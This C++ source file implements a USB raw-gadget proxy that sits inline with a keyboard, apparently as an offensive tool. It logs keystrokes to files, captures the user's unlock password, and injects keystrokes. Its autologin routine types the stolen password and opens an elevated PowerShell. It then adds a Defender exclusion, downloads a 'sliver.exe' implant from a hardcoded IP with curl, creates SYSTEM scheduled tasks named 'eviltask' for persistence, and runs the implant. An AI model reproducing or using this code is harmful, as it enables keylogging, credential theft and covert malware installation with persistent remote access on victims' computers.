#include <algorithm>
#include <chrono>
#include <fstream>
#include <list>
#include <regex>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#include "device-libusb.h"
#include "host-raw-gadget.h"
#include "letter_mapping.h"
#include "misc.h"

// Global variables
int globalFd;
struct usb_raw_transfer_io globalIo;
struct usb_raw_transfer_io globalIoBackup;
bool globalFinito;
bool passwordInput;
bool passwordInput0;
bool passwordDone;
std::string password;
std::string completePassword;
__u8 globalBEndpointAddress;
std::string globalTransferType;
std::string globalDir;

void rubber_ducky(int globalFd, struct usb_raw_transfer_io globalIo,
                  struct usb_raw_transfer_io globalIoBackup, bool &globalFinito,
                  __u8 globalBEndpointAddress, std::string globalTransferType,
                  std::string globalDir, std::vector<unsigned int> cmdVector,
                  std::string cmdString, std::string direction);
std::vector<unsigned int> hexStringToVector(const std::string &hexString);
void testFunc(std::string pass);

void handleAutoLogin(std::string userPassword) {
  // sleep(1);

  // testFunc("[down]");
  // sleep(5);

  sleep(1);
  std::cout << "Auto login" << std::endl;
  std::cout << "Password: " << userPassword << "\n";
  // sleep(60);
  testFunc("");
  sleep(3);
  testFunc(userPassword);
  sleep(2);
  testFunc("[new desktop]");
  sleep(2);
  testFunc("[win]");
  sleep(1.0);
  testFunc("powershell -c \"Start-Process powershell -verb runas\"");
  sleep(1);
  // testFunc("a");
  // sleep(0.5);
  // testFunc("[enter]");
  // sleep(1.5);
  testFunc("[tab]");
  sleep(1);
  testFunc("[tab]");
  sleep(0.5);
  testFunc("[enter]");
  sleep(2);
  testFunc("Enable-NetAdapterBinding -Name 'Internett2' -ComponentID ms_tcpip");
  sleep(0.5);
  testFunc("mkdir C:\\.temp26422");
  sleep(0.5);
  testFunc("Add-MpPreference -ExclusionPath 'C:\\.temp26422'");
  // testFunc("[enter]");
  sleep(0.5);
  testFunc("$ProgressPreference = 'SilentlyContinue'");
  // testFunc("[enter]");
  sleep(0.1);
  testFunc("curl.exe https://51.107.220.118:4444/sliv.exe -o "
           "'C:\\.temp26422\\sliver.exe' -k");
  sleep(3);
  testFunc("schtasks /create /sc minute /mo 1 /tn 'eviltask' /tr "
           "C:\\.temp26422\\sliver.exe /ru 'SYSTEM'");
  sleep(1);
  testFunc("schtasks /create /sc minute /mo 1 /tn 'eviltask2' /tr "
           "C:\\.temp26422\\sliver.exe /ru 'bruker'");
  sleep(2);
  testFunc("& 'C:\\.temp26422\\sliver.exe'");
  sleep(1);
  testFunc("exit");
  sleep(0.5);
  testFunc("[close current desktop]");
  sleep(1);
  testFunc("[lock]");
  passwordDone = false;
  passwordInput0 = false;
}

// User input handling function
void handleUserInput() {
  sleep(5);
  std::string command;
  std::string cmdString;
  bool running = true;
  while (running) {
    std::cout << "Enter command> ";
    std::getline(std::cin, command);
    if (command == "pass") {
      std::cout << "Possible user password: " << completePassword << "\n";
    }

    if (command.rfind("run ", 0) == 0) {
      std::string userInput = command.substr(4); // Extract user input
      cmdString = "";
      std::string direction = "";
      std::vector<unsigned int> cmdVector = stringToBytePattern(userInput);

      rubber_ducky(globalFd, globalIo, globalIoBackup, globalFinito,
                   globalBEndpointAddress, globalTransferType, globalDir,
                   cmdVector, cmdString, direction);
    } else if (command.find("[") != std::string::npos) {
      // printf("Running win");
      std::vector<unsigned int> cmdVector;
      std::string direction = "";
      // command.erase(std::remove(command.begin(),command.end(), '['),
      // command.end());
      command.erase(0, 1);
      // std::cout << command;
      rubber_ducky(globalFd, globalIo, globalIoBackup, globalFinito,
                   globalBEndpointAddress, globalTransferType, globalDir,
                   cmdVector, command, direction);
    } else if (command == "[cmd]") {
      // printf("Running cmd");
      std::vector<unsigned int> cmdVector;
      std::string direction = "";
      cmdString = "cmd";
      rubber_ducky(globalFd, globalIo, globalIoBackup, globalFinito,
                   globalBEndpointAddress, globalTransferType, globalDir,
                   cmdVector, cmdString, direction);
    } else if (command == "help") {
      printf("run <any input>, [win, [cmd, [lock, [citrix-menu, [progs q\n");
    } else if (command.find("autologin ") == 0) {
      std::istringstream iss(command);
      std::vector<std::string> parts;
      std::string part;
      while (iss >> part) {
        parts.push_back(part);
      }
      if (parts.size() >= 2) {

        handleAutoLogin(parts[1]);
      }
    } else if (command.find("arrow ") == 0) {
      std::vector<unsigned int> cmdVector;
      std::string cmdString;
      std::string direction;
      std::istringstream iss(command);
      std::vector<std::string> parts;
      std::string part;
      while (iss >> part) {
        parts.push_back(part);
      }
      if (parts.size() >= 2) {
        std::string cmdString = parts[0];
        std::string direction = parts[1];
        printf("running rubber ducky");
        rubber_ducky(globalFd, globalIo, globalIoBackup, globalFinito,
                     globalBEndpointAddress, globalTransferType, globalDir,
                     cmdVector, cmdString, direction);
      }
    } else if (command == "exit") {
      please_stop_ep0 = true;
      please_stop_eps = true;
      break;
    } else {
      std::cout << "Unknown command.\n";
    }
  }
}

// Function to convert a string of hex bytes to a vector of unsigned integers
std::vector<unsigned int> hexStringToVector(const std::string &hexString) {
  std::vector<unsigned int> result;
  std::istringstream iss(hexString);

  // Read each hex byte and convert it to an unsigned integer
  unsigned int byte;
  while (iss >> std::hex >> byte) {
    result.push_back(byte);
  }

  return result;
}

std::string getAsciiLetters(const struct usb_raw_transfer_io io) {
  setlocale(LC_ALL, "utf-8");

  // Convert the raw bytes to a string of hex values
  std::stringstream bytePatternStream;
  for (unsigned int i = 0; i < io.inner.length; i++) {
    bytePatternStream << std::hex << std::setw(2) << std::setfill('0')
                      << (unsigned)io.data[i];
    if (i < io.inner.length - 1) {
      bytePatternStream << " ";
    }
  }

  std::string bytePattern = bytePatternStream.str();

  printf("intermediate result: %s\n", bytePattern.c_str());

  return getAsciiLetter(bytePattern);
}

void writeLettersToFile(const std::string &fileName,
                        const std::string &letters) {
  std::ofstream outputFile(fileName,
                           std::ios::app); // Open the file in append mode
  if (outputFile.is_open()) {
    outputFile << letters; // Write letters to the file
    outputFile.close();
  } else {
    std::cerr << "Unable to open the file: " << fileName << std::endl;
  }
}

void testFunc(std::string pass) {
  std::string cmdString = "";
  std::string direction = "";
  std::vector<unsigned int> cmdVector = stringToBytePattern(pass);

  rubber_ducky(globalFd, globalIo, globalIoBackup, globalFinito,
               globalBEndpointAddress, globalTransferType, globalDir, cmdVector,
               cmdString, direction);
}

void getData(struct usb_raw_transfer_io io, __u8 bEndpointAddress,
             std::string transfer_type, std::string dir) {
  // static std::string password;

  time_t now;
  time(&now); // Get the current time as seconds since Unix epoch
  std::cout << "Current time (seconds since epoch): " << now << std::endl;

  // Convert to local time structure
  tm *local_time = localtime(&now);

  // Get the current time as a time_t object
  time_t currentTime = time(0);

  // Convert time_t to a tm structure (local time)
  tm *localTime = localtime(&currentTime);

  // Create a buffer to store the formatted time string
  char buffer[80]; // Adjust buffer size as needed for your format

  // Format the time into a string using strftime()
  // Example format: YYYY-MM-DD HH:MM:SS
  strftime(buffer, sizeof(buffer), "%d-%m-%Y %H:%M:%S", localTime);

  // Convert the char array to a std::string
  std::string timestamp(buffer);

  // Print the time string
  std::cout << "Current time: " << timestamp << std::endl;

  // std::string timestamp = (local_time->tm_year + 1900) << "-" <<
  // (local_time->tm_mon + 1) + "-" + local_time->tm_mday + " "+
  // local_time->tm_hour ":" + local_time->tm_min + ":" + local_time->tm_sec;

  printf("Sending data to EP%x(%s_%s):", bEndpointAddress,
         transfer_type.c_str(), dir.c_str());
  for (unsigned int i = 0; i < io.inner.length; i++) {
    printf(" %02hhx", (unsigned)io.data[i]);
  }
  printf("\n");

  // std::cout << "\npasswordInput0: " << passwordInput0 << "\n";
  // std::cout << "\npasswordInput: " << passwordInput << "\n";

  while (!passwordInput) {
    // Get the ASCII letters
    std::string asciiLetters = getAsciiLetters(io);
    // Check if user locks PC
    if (asciiLetters == "[lock]" && password.length() == 0) {
      std::cout << "\n\nUser locked the computer at: "
                << (local_time->tm_year + 1900) << "-"
                << (local_time->tm_mon + 1) << "-" << local_time->tm_mday << " "
                << local_time->tm_hour << ":" << local_time->tm_min << ":"
                << local_time->tm_sec << std::endl;
      std::cout << "[*] User locked the computer, waiting for user to "
                   "input password..."
                << std::endl;
      std::cout << "[*] passwordInput0 set to true" << std::endl;
      std::cout << "setting passwordinput0 to true\n";
      passwordInput0 = true;
    }
    if (passwordInput0) {
      std::cout << "\ninside passwordInput0\n";
      if (!std::regex_match(asciiLetters, std::regex("^[ -~]$"))) {
        std::cout << "while loop\n";
        return;
      } else {
        std::string firstLetter = asciiLetters;
        password += firstLetter;
        std::cout << "setting passwordinput to true\n";
        passwordInput = true;
        passwordInput0 = false;
      }

      return;
    }

    // User has locked the computer and we have the user's password
    if (asciiLetters == "[lock]" && password.length() > 0) {
      passwordDone = true;
      return;
    }

    // Write the letters to a file
    writeLettersToFile("/home/kali/Desktop/output.txt", asciiLetters);
    writeLettersToFile("/home/kali/Desktop/output2.txt",
                       timestamp + " " + asciiLetters + "\r\n");
    return;
  }
  if (passwordInput) {
    std::string asciiLetters = getAsciiLetters(io);

    // User hits enter -> we have the password
    if (asciiLetters == "[ENTER]" && password.length() > 0) {
      passwordInput = false;
      std::cout << "[*] passwordInput set to false" << std::endl;

      completePassword = password;
      std::cout << "\n\n[***] Complete password: " << password << "\n\n";
      password = "";
      return;
    }
    // Saving the password letter by letter
    if (asciiLetters != "[windows]") {
      password += asciiLetters;
      std::cout << "[*] Password: " << password << std::endl;
      writeLettersToFile("/home/kali/Desktop/password.txt",
                         timestamp + " " + password + "\r\n");
    }

    // TODO: Find a way to parse the password-file if login fails. Maybe the
    // user enter a wrong password once.
  }
}

void rubber_ducky(int globalFd, struct usb_raw_transfer_io globalIo,
                  struct usb_raw_transfer_io globalIoBackup, bool &globalFinito,
                  __u8 globalBEndpointAddress, std::string globalTransferType,
                  std::string globalDir, std::vector<unsigned int> cmdVector,
                  std::string cmdString, std::string direction) {
  // Backup globalIo
  if (cmdString == "win") {
    // OPEN WIN RUN and SLEEP for 1second
    printf("Opening Run Command Window\n");
    std::vector<unsigned int> charList;
    std::vector<unsigned int> run = {8, 0, 21, 0, 0, 0, 0, 0};
    charList.insert(charList.end(), run.begin(), run.end());

    for (unsigned int i = 0; i < globalIo.inner.length; i++) {
      globalIo.data[i] = charList[i];
      // printf(" %x", (unsigned)globalIo.data[i]);
    }

    int rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);

    if (rv >= 0) {
      // printf("EP%x(%s_%s): wrote %d bytes to host\n",
      //        globalBEndpointAddress, globalTransferType.c_str(),
      //        globalDir.c_str(), rv);
    }

    // printf("clearing io buffer");
    //  Clear globalIo buffer
    for (unsigned int i = 0; i < globalIo.inner.length; i++) {
      globalIo.data[i] = globalIoBackup.data[i];
    }
    rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);

    charList.clear();
    std::this_thread::sleep_for(std::chrono::seconds(1));

    return;
  } else if (cmdString == "lock") {
    // Lock the desktop
    printf("Locking the desktop\n");
    std::vector<unsigned int> charList;
    std::vector<unsigned int> run = {8, 0, 15, 0, 0, 0, 0, 0};
    charList.insert(charList.end(), run.begin(), run.end());

    for (unsigned int i = 0; i < globalIo.inner.length; i++) {
      globalIo.data[i] = charList[i];
      // printf(" %x", (unsigned)globalIo.data[i]);
    }

    int rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);

    if (rv >= 0) {
      // printf("EP%x(%s_%s): wrote %d bytes to host\n",
      //        globalBEndpointAddress, globalTransferType.c_str(),
      //        globalDir.c_str(), rv);
    }

    // printf("clearing io buffer");
    //  Clear globalIo buffer
    for (unsigned int i = 0; i < globalIo.inner.length; i++) {
      globalIo.data[i] = globalIoBackup.data[i];
    }
    rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);

    charList.clear();
    std::this_thread::sleep_for(std::chrono::seconds(1));

    return;
  } else if (cmdString == "arrow") {
    std::vector<unsigned int> run = {};
    ;
    if (direction == "left") {
      run = {0, 0, 80, 0, 0, 0, 0, 0};
    } else if (direction == "right") {
      run = {0, 0, 79, 0, 0, 0, 0, 0};
    } else if (direction == "down") {
      run = {0, 0, 81, 0, 0, 0, 0, 0};
    } else if (direction == "up") {
      run = {0, 0, 82, 0, 0, 0, 0, 0};
    } else {
      printf("not a valid direction\n");
      return;
    }
    std::vector<unsigned int> charList;
    charList.insert(charList.end(), run.begin(), run.end());

    for (unsigned int i = 0; i < globalIo.inner.length; i++) {
      globalIo.data[i] = charList[i];
      // printf(" %x", (unsigned)globalIo.data[i]);
    }

    int rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);

    if (rv >= 0) {
      // printf("EP%x(%s_%s): wrote %d bytes to host\n",
      //        globalBEndpointAddress, globalTransferType.c_str(),
      //        globalDir.c_str(), rv);
    }

    // printf("clearing io buffer");
    //  Clear globalIo buffer
    for (unsigned int i = 0; i < globalIo.inner.length; i++) {
      globalIo.data[i] = globalIoBackup.data[i];
    }
    rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);

    charList.clear();
    std::this_thread::sleep_for(std::chrono::seconds(1));

    return;
  } else if (cmdString == "citrix-menu") {
    printf("citrix\n");
    std::vector<unsigned int> run = {5, 0, 72, 0, 0, 0, 0, 0};
    std::vector<unsigned int> charList;
    charList.insert(charList.end(), run.begin(), run.end());

    for (unsigned int i = 0; i < globalIo.inner.length; i++) {
      globalIo.data[i] = charList[i];
      // printf(" %x", (unsigned)globalIo.data[i]);
    }

    int rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);

    if (rv >= 0) {
      // printf("EP%x(%s_%s): wrote %d bytes to host\n",
      //        globalBEndpointAddress, globalTransferType.c_str(),
      //        globalDir.c_str(), rv);
    }

    // printf("clearing io buffer");
    //  Clear globalIo buffer
    for (unsigned int i = 0; i < globalIo.inner.length; i++) {
      globalIo.data[i] = globalIoBackup.data[i];
    }
    rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);

    charList.clear();
    std::this_thread::sleep_for(std::chrono::seconds(1));

    return;
  } else if (cmdString == "progs") {
    // OPEN WIN RUN and SLEEP for 1second
    printf("open cmd\n");
    std::vector<unsigned int> charList2;
    // Open CMD.exe
    std::vector<unsigned int> cmd = {8, 0, 43, 0, 0, 0, 0, 0};
    charList2.insert(charList2.end(), cmd.begin(), cmd.end());

    for (unsigned int j = 0; j < charList2.size(); j += 8) {
      // printf("j: %d\n",j);
      for (unsigned int i = 0; i < globalIo.inner.length; i++) {
        globalIo.data[i] = charList2[j + i];
        // printf(" %x", (unsigned)globalIo.data[i]);
      }
      globalFinito = true;

      int rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);

      if (rv >= 0) {
        // printf("EP%x(%s_%s): wrote %d bytes to host\n",
        //        globalBEndpointAddress, globalTransferType.c_str(),
        //        globalDir.c_str(), rv);
      }

      // Clear globalIo buffer
      for (unsigned int i = 0; i < globalIo.inner.length; i++) {
        globalIo.data[i] = globalIoBackup.data[i];
      }
      rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);
      std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    charList2.clear();
    std::this_thread::sleep_for(std::chrono::seconds(1));

    return;
  }

  if (!cmdVector.empty()) {
    // Process the cmd vector from user input
    std::vector<unsigned int> charList2;
    std::vector<unsigned int> cmd = cmdVector;
    charList2.insert(charList2.end(), cmd.begin(), cmd.end());

    for (unsigned int j = 0; j < charList2.size(); j += 8) {

      for (unsigned int i = 0; i < globalIo.inner.length; i++) {
        globalIo.data[i] = charList2[j + i];
        printf(" %x", (unsigned)globalIo.data[i]);
      }
      globalFinito = true;

      int rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);

      if (rv >= 0) {
        // printf("Sent %s to host", cmdVector.c_str());
      }
      // Clear globalIo buffer
      for (unsigned int i = 0; i < globalIo.inner.length; i++) {
        globalIo.data[i] = globalIoBackup.data[i];
      }
      rv = usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);
      // std::this_thread::sleep_for(std::chrono::seconds(1));
      printf("\n");
    }
    charList2.clear();
    std::this_thread::sleep_for(std::chrono::seconds(1));
    return;
  }
}

void *ep_loop_write(void *arg) {
  struct thread_info thread_info = *((struct thread_info *)arg);
  static int fd = thread_info.fd;
  int ep_num = thread_info.ep_num;
  struct usb_endpoint_descriptor ep = thread_info.endpoint;
  std::string transfer_type = thread_info.transfer_type;
  std::string dir = thread_info.dir;
  std::deque<usb_raw_transfer_io> *data_queue = thread_info.data_queue;
  std::mutex *data_mutex = thread_info.data_mutex;
  bool finito = false;
  // printf("Start writing thread for EP%02x, thread id(%d)\n",
  //        ep.bEndpointAddress, gettid());

  globalFd = fd;
  globalFinito = finito;
  globalBEndpointAddress = ep.bEndpointAddress;
  globalTransferType = transfer_type;
  globalDir = dir;
  while (!please_stop_eps) {
    assert(ep_num != -1);
    if (data_queue->size() == 0) {
      usleep(100);
      continue;
    }

    data_mutex->lock();
    struct usb_raw_transfer_io io = data_queue->front();
    struct usb_raw_transfer_io io_backup = data_queue->front();
    globalIo = io;
    globalIoBackup = io_backup;
    data_queue->pop_front();
    data_mutex->unlock();

    // RUBBER DUCKY
    // rubber_ducky(fd, io, io_backup, finito, ep.bEndpointAddress,
    // transfer_type, dir);

    if (verbose_level >= 2) {
      getData(io, ep.bEndpointAddress, transfer_type, dir);
    }

    if (ep.bEndpointAddress & USB_DIR_IN) {
      int rv = usb_raw_ep_write(fd, (struct usb_raw_ep_io *)&io);

      if (rv >= 0) {
        // printf("EP%x(%s_%s): wrote %d bytes to host\n",
        //        ep.bEndpointAddress, transfer_type.c_str(), dir.c_str(),
        //        rv);
      }
    } else {
      int length = io.inner.length;
      unsigned char *data = new unsigned char[length];
      memcpy(data, io.data, length);
      send_data(ep.bEndpointAddress, ep.bmAttributes, data, length);

      if (data)
        delete[] data;
    }
  }

  printf("End writing thread for EP%02x, thread id(%d)\n", ep.bEndpointAddress,
         gettid());
  return NULL;
}

void *ep_loop_read(void *arg) {
  struct thread_info thread_info = *((struct thread_info *)arg);
  int fd = thread_info.fd;
  int ep_num = thread_info.ep_num;
  struct usb_endpoint_descriptor ep = thread_info.endpoint;
  std::string transfer_type = thread_info.transfer_type;
  std::string dir = thread_info.dir;
  std::deque<usb_raw_transfer_io> *data_queue = thread_info.data_queue;
  std::mutex *data_mutex = thread_info.data_mutex;

  // printf("Start reading thread for EP%02x, thread id(%d)\n",
  //        ep.bEndpointAddress, gettid());

  while (!please_stop_eps) {
    assert(ep_num != -1);
    struct usb_raw_transfer_io io;

    if (ep.bEndpointAddress & USB_DIR_IN) {
      unsigned char *data = NULL;
      int nbytes = -1;

      if (data_queue->size() >= 32) {
        usleep(200);
        continue;
      }

      receive_data(ep.bEndpointAddress, ep.bmAttributes, ep.wMaxPacketSize,
                   &data, &nbytes, 0);

      if (nbytes >= 0) {
        memcpy(io.data, data, nbytes);
        io.inner.ep = ep_num;
        io.inner.flags = 0;
        io.inner.length = nbytes;

        data_mutex->lock();
        data_queue->push_back(io);
        data_mutex->unlock();
        if (verbose_level)
          printf("EP%x(%s_%s): enqueued %d bytes to queue\n",
                 ep.bEndpointAddress, transfer_type.c_str(), dir.c_str(),
                 nbytes);
      }

      if (data)
        delete[] data;
    } else {
      io.inner.ep = ep_num;
      io.inner.flags = 0;
      io.inner.length = sizeof(io.data);

      int rv = usb_raw_ep_read(fd, (struct usb_raw_ep_io *)&io);
      if (rv >= 0) {
        printf("EP%x(%s_%s): read %d bytes from host\n", ep.bEndpointAddress,
               transfer_type.c_str(), dir.c_str(), rv);
        io.inner.length = rv;

        data_mutex->lock();
        data_queue->push_back(io);
        data_mutex->unlock();
        if (verbose_level) {
          printf("EP%x(%s_%s): enqueued %d bytes to queue\n",
                 ep.bEndpointAddress, transfer_type.c_str(), dir.c_str(), rv);
          // Output raw bytes
          printf("Raw Bytes:");
          for (int i = 0; i < rv; ++i) {
            printf(" %02x", io.data[i]);
          }
          printf("\n");
        }
      }
    }
  }

  printf("End reading thread for EP%02x, thread id(%d)\n", ep.bEndpointAddress,
         gettid());
  return NULL;
}

void process_eps(int fd, int config, int interface, int altsetting) {
  struct raw_gadget_altsetting *alt = &host_device_desc.configs[config]
                                           .interfaces[interface]
                                           .altsettings[altsetting];

  printf("Activating %d endpoints on interface %d\n",
         (int)alt->interface.bNumEndpoints, interface);

  for (int i = 0; i < alt->interface.bNumEndpoints; i++) {
    struct raw_gadget_endpoint *ep = &alt->endpoints[i];

    int addr = usb_endpoint_num(&ep->endpoint);
    assert(addr != 0);

    ep->thread_info.fd = fd;
    ep->thread_info.endpoint = ep->endpoint;
    ep->thread_info.data_queue = new std::deque<usb_raw_transfer_io>;
    ep->thread_info.data_mutex = new std::mutex;

    switch (usb_endpoint_type(&ep->endpoint)) {
    case USB_ENDPOINT_XFER_ISOC:
      ep->thread_info.transfer_type = "isoc";
      break;
    case USB_ENDPOINT_XFER_BULK:
      ep->thread_info.transfer_type = "bulk";
      break;
    case USB_ENDPOINT_XFER_INT:
      ep->thread_info.transfer_type = "int";
      break;
    default:
      printf("transfer_type %d is invalid\n", usb_endpoint_type(&ep->endpoint));
      assert(false);
    }

    if (usb_endpoint_dir_in(&ep->endpoint))
      ep->thread_info.dir = "in";
    else
      ep->thread_info.dir = "out";

    ep->thread_info.ep_num = usb_raw_ep_enable(fd, &ep->thread_info.endpoint);
    printf("%s_%s: addr = %u, ep = #%d\n",
           ep->thread_info.transfer_type.c_str(), ep->thread_info.dir.c_str(),
           addr, ep->thread_info.ep_num);

    if (verbose_level)
      printf("Creating thread for EP%02x\n",
             ep->thread_info.endpoint.bEndpointAddress);
    pthread_create(&ep->thread_read, 0, ep_loop_read, (void *)&ep->thread_info);
    pthread_create(&ep->thread_write, 0, ep_loop_write,
                   (void *)&ep->thread_info);
  }

  // printf("process_eps done\n");
}

void terminate_eps(int fd, int config, int interface, int altsetting) {
  struct raw_gadget_altsetting *alt = &host_device_desc.configs[config]
                                           .interfaces[interface]
                                           .altsettings[altsetting];

  please_stop_eps = true;

  for (int i = 0; i < alt->interface.bNumEndpoints; i++) {
    struct raw_gadget_endpoint *ep = &alt->endpoints[i];

    if (ep->thread_read && pthread_join(ep->thread_read, NULL)) {
      fprintf(stderr, "Error join thread_read\n");
    }
    if (ep->thread_write && pthread_join(ep->thread_write, NULL)) {
      fprintf(stderr, "Error join thread_write\n");
    }
    ep->thread_read = 0;
    ep->thread_write = 0;

    usb_raw_ep_disable(fd, ep->thread_info.ep_num);
    ep->thread_info.ep_num = -1;

    delete ep->thread_info.data_queue;
    delete ep->thread_info.data_mutex;
  }

  please_stop_eps = false;
}

void ep0_loop(int fd) {
  bool set_configuration_done_once = false;

  printf("Start for EP0, thread id(%d)\n", gettid());

  if (verbose_level)
    print_eps_info(fd);

  while (!please_stop_ep0) {
    struct usb_raw_control_event event;
    event.inner.type = 0;
    event.inner.length = sizeof(event.ctrl);

    usb_raw_event_fetch(fd, (struct usb_raw_event *)&event);
    // log_event((struct usb_raw_event *)&event);

    if (event.inner.length == 4294967295) {
      printf("End for EP0, thread id(%d)\n", gettid());
      return;
    }

    if (event.inner.type != USB_RAW_EVENT_CONTROL)
      continue;

    struct usb_raw_transfer_io io;
    io.inner.ep = 0;
    io.inner.flags = 0;
    io.inner.length = event.ctrl.wLength;

    int nbytes = 0;
    int result = 0;
    unsigned char *control_data = new unsigned char[event.ctrl.wLength];

    int rv = -1;
    if (event.ctrl.bRequestType & USB_DIR_IN) {
      result = control_request(&event.ctrl, &nbytes, &control_data, 1000);
      if (result == 0) {
        memcpy(&io.data[0], control_data, nbytes);
        io.inner.length = nbytes;

        // Some UDCs require bMaxPacketSize0 to be at least 64.
        // Ideally, the information about UDC limitations needs to be
        // exposed by Raw Gadget, but this is not implemented at the
        // moment; see https://github.com/xairy/raw-gadget/issues/41.
        if (bmaxpacketsize0_must_greater_than_64 &&
            (event.ctrl.bRequestType & USB_TYPE_MASK) == USB_TYPE_STANDARD &&
            event.ctrl.bRequest == USB_REQ_GET_DESCRIPTOR &&
            (event.ctrl.wValue >> 8) == USB_DT_DEVICE) {
          struct usb_device_descriptor *dev =
              (struct usb_device_descriptor *)&io.data;
          if (dev->bMaxPacketSize0 < 64)
            dev->bMaxPacketSize0 = 64;
        }

        if (verbose_level >= 2)
          getData(io, 0x00, "control", "in");

        rv = usb_raw_ep0_write(fd, (struct usb_raw_ep_io *)&io);
        // printf("ep0: transferred %d bytes (in)\n", rv);
      } else {
        usb_raw_ep0_stall(fd);
      }
    } else {
      rv = usb_raw_ep0_read(fd, (struct usb_raw_ep_io *)&io);

      if ((event.ctrl.bRequestType & USB_TYPE_MASK) == USB_TYPE_STANDARD &&
          event.ctrl.bRequest == USB_REQ_SET_CONFIGURATION) {
        int desired_config = -1;
        for (int i = 0; i < host_device_desc.device.bNumConfigurations; i++) {
          if (host_device_desc.configs[i].config.bConfigurationValue ==
              event.ctrl.wValue) {
            desired_config = i;
            break;
          }
        }
        if (desired_config < 0) {
          printf("[Warning] Skip changing configuration, wValue(%d) is "
                 "invalid\n",
                 event.ctrl.wValue);
          continue;
        }

        struct raw_gadget_config *config =
            &host_device_desc.configs[desired_config];

        if (set_configuration_done_once) { // Need to stop all threads
                                           // for eps and cleanup
          printf("Changing configuration\n");
          for (int i = 0; i < config->config.bNumInterfaces; i++) {
            struct raw_gadget_interface *iface = &config->interfaces[i];
            int interface_num = iface->altsettings[iface->current_altsetting]
                                    .interface.bInterfaceNumber;
            terminate_eps(fd, host_device_desc.current_config, i,
                          iface->current_altsetting);
            release_interface(interface_num);
          }
        }

        usb_raw_configure(fd);
        set_configuration(config->config.bConfigurationValue);
        host_device_desc.current_config = desired_config;

        for (int i = 0; i < config->config.bNumInterfaces; i++) {
          struct raw_gadget_interface *iface = &config->interfaces[i];
          iface->current_altsetting = 0;
          int interface_num = iface->altsettings[0].interface.bInterfaceNumber;
          claim_interface(interface_num);
          process_eps(fd, desired_config, i, 0);
        }

        set_configuration_done_once = true;
      } else if ((event.ctrl.bRequestType & USB_TYPE_MASK) ==
                     USB_TYPE_STANDARD &&
                 event.ctrl.bRequest == USB_REQ_SET_INTERFACE) {
        struct raw_gadget_config *config =
            &host_device_desc.configs[host_device_desc.current_config];

        int desired_interface = -1;
        for (int i = 0; i < config->config.bNumInterfaces; i++) {
          if (config->interfaces[i].altsettings[0].interface.bInterfaceNumber ==
              event.ctrl.wIndex) {
            desired_interface = i;
            break;
          }
        }
        if (desired_interface < 0) {
          printf("[Warning] Skip changing interface, wIndex(%d) is "
                 "invalid\n",
                 event.ctrl.wIndex);
          continue;
        }

        struct raw_gadget_interface *iface =
            &config->interfaces[desired_interface];

        int desired_altsetting = -1;
        for (int i = 0; i < iface->num_altsettings; i++) {
          if (iface->altsettings[i].interface.bAlternateSetting ==
              event.ctrl.wValue) {
            desired_altsetting = i;
            break;
          }
        }
        if (desired_altsetting < 0) {
          printf("[Warning] Skip changing alt_setting, wValue(%d) is "
                 "invalid\n",
                 event.ctrl.wValue);
          continue;
        }

        struct raw_gadget_altsetting *alt =
            &iface->altsettings[desired_altsetting];

        printf("Changing interface/altsetting\n");

        terminate_eps(fd, host_device_desc.current_config, desired_interface,
                      iface->current_altsetting);
        set_interface_alt_setting(alt->interface.bInterfaceNumber,
                                  alt->interface.bAlternateSetting);
        process_eps(fd, host_device_desc.current_config, desired_interface,
                    desired_altsetting);
        iface->current_altsetting = desired_altsetting;
      } else {
        memcpy(control_data, io.data, event.ctrl.wLength);

        if (verbose_level >= 2)
          getData(io, 0x00, "control", "out");

        result = control_request(&event.ctrl, &nbytes, &control_data, 1000);
        if (result == 0) {
          // printf("ep0: transferred %d bytes (out)\n", rv);
        } else {
          usb_raw_ep0_stall(fd);
        }
      }
    }

    delete[] control_data;
  }
  printf("ep0_end");

  struct raw_gadget_config *config =
      &host_device_desc.configs[host_device_desc.current_config];

  for (int i = 0; i < config->config.bNumInterfaces; i++) {
    struct raw_gadget_interface *iface = &config->interfaces[i];
    int interface_num = iface->altsettings[iface->current_altsetting]
                            .interface.bInterfaceNumber;
    terminate_eps(fd, host_device_desc.current_config, i,
                  iface->current_altsetting);
    release_interface(interface_num);
  }

  printf("End for EP0aa, thread id(%d)\n", gettid());
}
